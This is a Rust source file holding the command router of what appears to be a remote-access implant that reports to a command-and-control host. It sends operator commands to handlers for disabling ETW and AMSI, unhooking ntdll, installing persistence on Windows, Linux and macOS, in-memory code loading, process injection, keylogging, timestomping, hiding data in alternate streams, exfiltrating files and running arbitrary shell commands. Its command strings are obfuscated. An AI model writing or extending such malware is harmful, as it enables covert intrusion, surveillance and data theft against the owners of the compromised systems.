// src/agent/handlers/mod.rs
//
// Command dispatch split by domain. Each submodule owns a focused set of
// commands with its own tests. The router in this file is the only place
// that maps command strings to handler functions.

pub mod config;
pub mod network;
pub mod evasion;
pub mod execution;
pub mod files;
pub mod process;
pub mod lifecycle;
pub mod persistence;

use std::sync::{Arc, Mutex};
use tokio::sync::mpsc;

use crate::common::{CommandResponse, SecuredCommand};
use crate::agent::scripting::ExtensionManager;
use crate::agent::pivot::PivotManager;
use crate::agent::jobs::JobManager;
use crate::lc;

// ── Shared types ───────────────────────────────────────────────────────

pub struct HandlerContext {
    pub proxy_handle: Arc<Mutex<Option<tokio::task::AbortHandle>>>,
    pub rportfwd_handles: Arc<Mutex<Vec<RportfwdHandle>>>,
    pub ext_manager: Arc<Mutex<ExtensionManager>>,
    pub job_manager: Arc<Mutex<JobManager>>,
    pub c2_host: String,
    pub tx: mpsc::Sender<Vec<u8>>,
    pub pivot_mgr: Arc<tokio::sync::Mutex<PivotManager>>,
}

/// Tracks a single active reverse port forward on the agent side.
pub struct RportfwdHandle {
    pub server_port: u16,
    pub target_host: String,
    pub target_port: u16,
    pub abort: tokio::task::AbortHandle,
}

pub enum AgentAction {
    UpdateConfig(u64, u32, u32),
    SetMode(bool),
    None,
}

/// Internal result type so handlers that send their own responses
/// (e.g. recursive download) don't cause a duplicate send.
pub(crate) enum DispatchResult {
    Reply(String, String, i32, AgentAction),
    AlreadySent(AgentAction),
}

// ── Safe mutex access ──────────────────────────────────────────────────

macro_rules! lock_or_action {
    ($mutex:expr, $name:expr) => {
        match $mutex.lock() {
            Ok(guard) => guard,
            Err(_) => {
                return DispatchResult::Reply(
                    String::new(), format!("Internal: {} lock poisoned", $name), 1, AgentAction::None
                );
            }
        }
    };
}

// Re-export macros for submodules
pub(crate) use lock_or_action;

pub(crate) fn wrap_result(r: Result<String, String>) -> DispatchResult {
    match r {
        Ok(msg) => DispatchResult::Reply(msg, String::new(), 0, AgentAction::None),
        Err(e)  => DispatchResult::Reply(String::new(), e, 1, AgentAction::None),
    }
}

// ── Public dispatch entry point ────────────────────────────────────────

pub async fn dispatch(ctx: &HandlerContext, msg: SecuredCommand) -> AgentAction {
    let req_id = msg.counter;
    let cmd = &msg.command;

    let result = route(ctx, cmd, req_id).await;

    match result {
        DispatchResult::Reply(output, error, exit_code, action) => {
            let resp = CommandResponse { request_id: req_id, output, error, exit_code };
            if let Ok(data) = serde_json::to_vec(&resp) {
                let _ = ctx.tx.send(data).await;
            }
            action
        }
        DispatchResult::AlreadySent(action) => action,
    }
}

// ── Command router ─────────────────────────────────────────────────────
//
// Each arm delegates to a focused submodule. The router itself does no
// business logic — it is a pure command-string → handler mapping.

async fn route(ctx: &HandlerContext, cmd: &str, req_id: u64) -> DispatchResult {
    // ── Config & Mode ──────────────────────────────────────────────
    if let Some(args) = cmd.strip_prefix(&lc!("sleep ")) {
        return config::handle_sleep(args);
    }
    if cmd == lc!("beacon:mode active") {
        return config::handle_beacon_mode(true);
    }
    if cmd == lc!("beacon:mode passive") {
        return config::handle_beacon_mode(false);
    }
    if cmd == lc!("fallback:config") {
        return config::handle_fallback_config();
    }

    // ── Jobs ───────────────────────────────────────────────────────
    if cmd == lc!("jobs:list") {
        let info = lock_or_action!(ctx.job_manager, "job_manager").list_json();
        return DispatchResult::Reply(info, String::new(), 0, AgentAction::None);
    }
    if let Some(args) = cmd.strip_prefix(&lc!("jobs:kill ")) {
        let id = args.trim().parse::<u32>().unwrap_or(0);
        let msg = lock_or_action!(ctx.job_manager, "job_manager").kill(id);
        return DispatchResult::Reply(msg, String::new(), 0, AgentAction::None);
    }
    if cmd == lc!("jobs:purge") {
        let n = lock_or_action!(ctx.job_manager, "job_manager").purge_completed();
        return DispatchResult::Reply(format!("Purged {} finished jobs", n), String::new(), 0, AgentAction::None);
    }

    // ── Network (pivot, proxy, rportfwd) ───────────────────────────
    if let Some(args) = cmd.strip_prefix(&lc!("pivot:listener_tcp ")) {
        return network::handle_pivot_tcp(ctx, args).await;
    }
    if let Some(args) = cmd.strip_prefix(&lc!("pivot:listener_smb ")) {
        return network::handle_pivot_smb(ctx, args).await;
    }
    if cmd.starts_with(&lc!("proxy:start ")) {
        let (o, e, c) = network::handle_proxy_start(ctx, cmd, req_id).await;
        return DispatchResult::Reply(o, e, c, AgentAction::None);
    }
    if cmd == lc!("proxy:stop") {
        let (o, e, c) = network::handle_proxy_stop(ctx);
        return DispatchResult::Reply(o, e, c, AgentAction::None);
    }
    if cmd.starts_with(&lc!("rportfwd:start ")) {
        return network::handle_rportfwd_start(ctx, cmd).await;
    }
    if cmd.starts_with(&lc!("rportfwd:stop ")) {
        return network::handle_rportfwd_stop(ctx, cmd);
    }
    if cmd == lc!("rportfwd:list") {
        return network::handle_rportfwd_list(ctx);
    }

    // ── Evasion ────────────────────────────────────────────────────
    if cmd == lc!("evasion:patch_etw")     { return evasion::handle_patch_etw(); }
    if cmd == lc!("evasion:patch_amsi")    { return evasion::handle_patch_amsi(); }
    if cmd == lc!("evasion:unhook_ntdll")  { return evasion::handle_unhook_ntdll(); }
    if cmd == lc!("evasion:patch_all")     { return evasion::handle_patch_all(); }
    if cmd == lc!("evasion:syscall_check") { return evasion::handle_syscall_check(); }

    // ── Persistence ────────────────────────────────────────────────
    if cmd == lc!("persist:list") { return persistence::handle_list(); }

    // Windows
    if let Some(a) = cmd.strip_prefix(&lc!("persist:run_hklm_remove ")) { return persistence::handle_run_hklm_remove(a); }
    if let Some(a) = cmd.strip_prefix(&lc!("persist:run_hklm "))        { return persistence::handle_run_hklm(a); }
    if let Some(a) = cmd.strip_prefix(&lc!("persist:run_remove "))      { return persistence::handle_run_remove(a); }
    if let Some(a) = cmd.strip_prefix(&lc!("persist:run "))             { return persistence::handle_run(a); }
    if let Some(a) = cmd.strip_prefix(&lc!("persist:task_remove "))     { return persistence::handle_task_remove(a); }
    if let Some(a) = cmd.strip_prefix(&lc!("persist:task "))            { return persistence::handle_task(a); }
    if let Some(a) = cmd.strip_prefix(&lc!("persist:startup_remove "))  { return persistence::handle_startup_remove(a); }
    if let Some(a) = cmd.strip_prefix(&lc!("persist:startup "))         { return persistence::handle_startup(a); }

    // Linux
    if let Some(a) = cmd.strip_prefix(&lc!("persist:systemd_remove "))  { return persistence::handle_systemd_remove(a); }
    if let Some(a) = cmd.strip_prefix(&lc!("persist:systemd "))         { return persistence::handle_systemd(a); }
    if let Some(a) = cmd.strip_prefix(&lc!("persist:profile_remove "))  { return persistence::handle_profile_remove(a); }
    if let Some(a) = cmd.strip_prefix(&lc!("persist:profile "))         { return persistence::handle_profile(a); }

    // macOS
    if let Some(a) = cmd.strip_prefix(&lc!("persist:launchagent_remove ")) { return persistence::handle_launchagent_remove(a); }
    if let Some(a) = cmd.strip_prefix(&lc!("persist:launchagent "))        { return persistence::handle_launchagent(a); }

    // Cross-platform cron (Linux and macOS share the command name; platform
    // dispatch happens inside the handler via cfg gates in mod.rs)
    if let Some(a) = cmd.strip_prefix(&lc!("persist:cron_remove ")) {
        #[cfg(target_os = "linux")]   { return persistence::handle_cron_linux_remove(a); }
        #[cfg(target_os = "macos")]   { return persistence::handle_cron_macos_remove(a); }
        #[cfg(not(any(target_os = "linux", target_os = "macos")))]
        return wrap_result(Err::<String, String>("persist:cron is Linux/macOS only".into()));
    }
    if let Some(a) = cmd.strip_prefix(&lc!("persist:cron ")) {
        #[cfg(target_os = "linux")]   { return persistence::handle_cron_linux(a); }
        #[cfg(target_os = "macos")]   { return persistence::handle_cron_macos(a); }
        #[cfg(not(any(target_os = "linux", target_os = "macos")))]
        return wrap_result(Err::<String, String>("persist:cron is Linux/macOS only".into()));
    }

    // ── Execution (inmem, extensions, shell) ───────────────────────
    if let Some(shell_cmd) = cmd.strip_prefix(&lc!("bg ")) {
        return execution::handle_bg(ctx, shell_cmd, req_id);
    }
    if cmd.starts_with(&lc!("ext:load "))     { return execution::handle_extension_bg(ctx, cmd, req_id); }
    if cmd.starts_with(&lc!("inmem:pe "))     { return execution::handle_load_pe(ctx, cmd, req_id); }
    if cmd.starts_with(&lc!("inmem:bof "))    { return execution::handle_run_bof(ctx, cmd, req_id); }
    if cmd.starts_with(&lc!("inmem:dotnet ")) {
        let (o, e, c) = execution::handle_run_dotnet(cmd);
        return DispatchResult::Reply(o, e, c, AgentAction::None);
    }

    // ── Files & Artifacts ──────────────────────────────────────────
    if cmd.starts_with(&lc!("timestomp:set "))      { return files::handle_timestomp_set(cmd); }
    if cmd.starts_with(&lc!("timestomp "))           { return files::handle_timestomp(cmd); }
    if let Some(path) = cmd.strip_prefix(&lc!("secure_delete ")) {
        return wrap_result(crate::agent::artifacts::secure_delete(path));
    }
    if cmd.starts_with(&lc!("ads:write "))  { return files::handle_ads_write(cmd); }
    if cmd.starts_with(&lc!("ads:read "))   { return files::handle_ads_read(cmd); }
    if let Some(path) = cmd.strip_prefix(&lc!("ads:list ")) { return files::handle_ads_list(path); }
    if cmd.starts_with(&lc!("file:read_recursive|")) {
        files::handle_recursive_download(ctx, cmd, req_id).await;
        return DispatchResult::AlreadySent(AgentAction::None);
    }
    if cmd.starts_with(&lc!("file:write|")) {
        let (o, e, c) = files::handle_file_write(cmd);
        return DispatchResult::Reply(o, e, c, AgentAction::None);
    }
    if cmd.starts_with(&lc!("file:read|")) {
        let (o, e, c) = files::handle_file_read(cmd);
        return DispatchResult::Reply(o, e, c, AgentAction::None);
    }
    if let Some(path) = cmd.strip_prefix(&lc!("fs:ls ")) {
        return DispatchResult::Reply(
            crate::agent::scripting::get_directory_json(path), String::new(), 0, AgentAction::None,
        );
    }

    // ── Process (injection, migration, keylogger) ──────────────────
    if cmd.starts_with(&lc!("proc:inject ")) {
        let (o, e, c) = process::handle_injection(cmd.to_string()).await;
        return DispatchResult::Reply(o, e, c, AgentAction::None);
    }
    if let Some(args) = cmd.strip_prefix(&lc!("migrate:spawn "))  { return process::handle_migrate_spawn(ctx, args, req_id); }
    if let Some(args) = cmd.strip_prefix(&lc!("migrate:inject ")) { return process::handle_migrate_inject(ctx, args, req_id); }
    if cmd == lc!("keylogger:start") { return DispatchResult::Reply(crate::agent::keylogger::start(), String::new(), 0, AgentAction::None); }
    if cmd == lc!("keylogger:stop")  { return DispatchResult::Reply(crate::agent::keylogger::stop(), String::new(), 0, AgentAction::None); }
    if cmd == lc!("keylogger:dump") {
        let logs = crate::agent::keylogger::get_logs();
        let out = if logs.is_empty() { lc!("(Buffer Empty)") } else { logs };
        return DispatchResult::Reply(out, String::new(), 0, AgentAction::None);
    }

    // ── Lifecycle ──────────────────────────────────────────────────
    if cmd == lc!("sys:die") {
        return lifecycle::handle_self_destruct(ctx, req_id).await;
    }

    // ── Explicit shell command ─────────────────────────────────────
    if cmd.starts_with(&lc!("shell ")) {
        return execution::handle_shell(cmd.strip_prefix(&lc!("shell ")).unwrap_or("")).await;
    }
    if cmd.starts_with("!") {
        return execution::handle_shell(&cmd[1..]).await;
    }

    // ── Unknown command ────────────────────────────────────────────
    DispatchResult::Reply(
        String::new(),
        format!("Unknown command: '{}'. Use 'shell <cmd>' or '!<cmd>' for OS shell execution.", cmd),
        1,
        AgentAction::None,
    )
}
